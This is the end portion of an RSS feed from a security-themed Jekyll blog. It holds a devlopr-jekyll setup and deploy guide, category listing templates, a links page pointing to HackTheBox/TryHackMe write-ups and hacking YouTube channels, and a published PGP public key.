![Devlopr Jekyll Repo](/assets/img/posts/fork34.png){:class=&quot;img-fluid&quot;}

&gt; **Step 5** - Install the development requirements:

### Set up local development environment

1. [Git](https://git-scm.com/)
2. [Ruby](https://www.ruby-lang.org/) and [Bundler](https://bundler.io/)
3. [VSCode](https://code.visualstudio.com/download)

We need ruby and bundler to build our site locally. After installation check if its working:

For ruby :

```bash
$ ruby -v
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
```
For bundler :

```bash
$ gem install bundler
$ bundler -v
Bundler version 2.2.6
```
Add jekyll :

```bash
$ bundle add jekyll
```
 This command will add the Jekyll gem to our Gemfile and install it to the ./vendor/bundle/ folder.

You can check the jekyll version

```
$ bundle exec jekyll -v
jekyll 4.2.0
```

&gt; **Step 6.** Install the gem dependencies by running the following command

```bash
$ bundle update
$ bundle install
```

&gt; **Step 7.** Serve the site locally by running the following command below:

```bash
$ bundle exec jekyll serve --watch
```
or you can also serve using :

```bash
$ jekyll serve
```

Visit [http://localhost:4000](http://localhost:4000) for development server

![Devlopr Jekyll Repo](/assets/img/posts/fork4.png){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork41.png){:class=&quot;img-fluid&quot;}

### Adding Content

Start populating your blog by adding your .md files in _posts. devlopr-jekyll already has a few examples.

#### YAML Post Example:

```yml
---
layout: post
title: Sample Post
author: Sujay Kundu
date: '2019-05-21 14:35:23 +0530'
category:
        - jekyll
summary: This is the summary for the sample post
thumbnail: sample.png
---

Hi ! This is sample post.

```

#### YAML Page Example:

```yml
---
layout: page
title: Sample Page
menus: header
permalink: /sample-page/
---

Hi ! This is sample page.
```

#### Editing stylesheet

You’ll only work with a single file to edit/add theme style: assets/css/main.scss.

### Deploy your Changes

Once happy with your blog changes. Push your changes to master branch.

&gt; **Step 8.** Push Your Local Changes

```bash
 $ git add .
 $ git commit -m &quot;my new blog using devlopr-jekyll&quot;
 $ git push origin master
```

Visit your Github Repo settings ! Enable master branch as Github Pages Branch :

![Devlopr Jekyll Repo](/assets/img/posts/fork6.png){:class=&quot;img-fluid&quot;}

&gt; **Step 9.** Deploy your Blog :

![Devlopr Jekyll Repo](/assets/img/posts/fork7.png){:class=&quot;img-fluid&quot;}

&gt; Congrats ! On your new shining Blog !

You can visit the blog using [http://your-github-username.github.io](http://your-github-username.github.io).

</description>
            <link>/get-started/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Jekyll</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.jekyll %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>/blog/categories/jekyll/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Journey</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.journey %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;
</description>
            <link>/blog/categories/journey</link>
          </item>
        
      
    
      
        
          <item>
            <title>Links</title>
            <description>&lt;h1 class=&quot;text-center&quot;&gt; Usefull Links &lt;/h1&gt;
&lt;hr&gt;
&lt;h2 class=&quot;text-center&quot;&gt; HackTheBox &amp; TryHackMe WriteUps &lt;/h2&gt;

&lt;p&gt;  &lt;a href=&quot;https://fr3akazo1d.github.io&quot; target=&quot;_blank&quot;&gt;Fr3akazo1d! &lt;/a&gt; &lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://marnick.net/&quot; target=&quot;_blank&quot;&gt;Marnick &lt;/a&gt; &lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://zebra777.github.io/&quot; target=&quot;_blank&quot;&gt;Zebra777 &lt;/a&gt; &lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://marcorei7.wordpress.com/blogposts/&quot; target=&quot;_blank&quot;&gt;Marcorei7 &lt;/a&gt; &lt;/p&gt;

&lt;hr&gt;

&lt;h2 class=&quot;text-center&quot;&gt;Youtube content about Pentesting/Hacking &lt;/h2&gt;

&lt;h4&gt;John Hammond: &lt;/h4&gt;
&lt;p&gt;John Hammond provid good content about Hacking/Pentesting and Malware analysis. &lt;/p&gt;
&lt;p&gt;YouTube-Channel: &lt;a href=&quot;https://www.youtube.com/user/RootOfTheNull&quot; target=&quot;_blank&quot;&gt;John Hammond &lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;Nahamsec: &lt;/h4&gt;
&lt;p&gt;YouTube-Channel: &lt;a href=&quot;https://www.youtube.com/channel/UCCZDt7MuC3Hzs6IH4xODLBw&quot; target=&quot;_blank&quot;&gt;Nahamsec &lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;The Cyber Mentor: &lt;/h4&gt;
&lt;p&gt;YouTube-Channel: &lt;a href=&quot;https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw&quot; target=&quot;_blank&quot;&gt;The Cyber Mentor &lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;Live Overflow: &lt;/h4&gt;
&lt;p&gt;YouTube-Channel: &lt;a href=&quot;https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w&quot; target=&quot;_blank&quot;&gt;Live Overflow &lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;NetworkChuck: &lt;/h4&gt;
&lt;p&gt;YouTube-Channel: &lt;a href=&quot;https://www.youtube.com/user/NetworkChuck&quot; target=&quot;_blank&quot;&gt;NetworkChuck &lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;David Bombal: &lt;/h4&gt;
&lt;p&gt;YouTube-Channel: &lt;a href=&quot;https://www.youtube.com/user/ConfigTerm&quot; target=&quot;_blank&quot;&gt;David Bombal &lt;/a&gt;&lt;/p&gt;
</description>
            <link>/links/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>GNUPG Public Key</title>
            <description># OPENPGP Public Key

---

```
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: OpenPGP.js v4.10.10
Comment: https://openpgpjs.org

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
tPkcab3lLuh5sQ==
=JT86
-----END PGP PUBLIC KEY BLOCK-----
```

---
</description>
            <link>/pgp/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Guides</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.sample_category %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>/blog/categories/sample_category/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Journey</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.security %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;
</description>
            <link>/blog/categories/security</link>
          </item>
        
      
    
      
    
      
    
      
        
          <item>
            <title>Walkthroughs</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.walkthroughs %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;
</description>
            <link>/blog/categories/walkthroughs</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    

  </channel>
</rss>